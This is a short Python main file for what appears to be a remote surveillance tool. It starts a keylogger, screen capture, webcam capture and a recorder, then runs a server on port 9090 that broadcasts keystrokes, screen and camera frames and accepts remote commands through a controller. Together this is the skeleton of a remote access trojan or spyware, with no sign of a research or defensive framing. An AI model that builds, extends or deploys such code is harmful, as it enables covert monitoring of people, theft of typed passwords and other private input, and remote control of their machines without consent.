import os
import threading

import server
import keylogger as kl
import screencap as sc
import controller
import recorder as rec
import camera as cam

PORT = int(os.environ.get("NORA_PORT", 9090))


def main():
    recorder = rec.Recorder(output_dir="recordings", fps=10)
    camera = cam.CameraCapture(on_frame=server.broadcast_camera, fps=10, quality=55)

    server.init(controller.handle_command, recorder, camera)

    keylogger = kl.Keylogger(server.broadcast_key)
    keylogger.start()

    capture = sc.ScreenCapture(server.broadcast_frame, fps=12, quality=55, scale=0.6)
    capture.attach_recorder(recorder)
    capture.start()

    server.run(port=PORT)


if __name__ == "__main__":
    main()
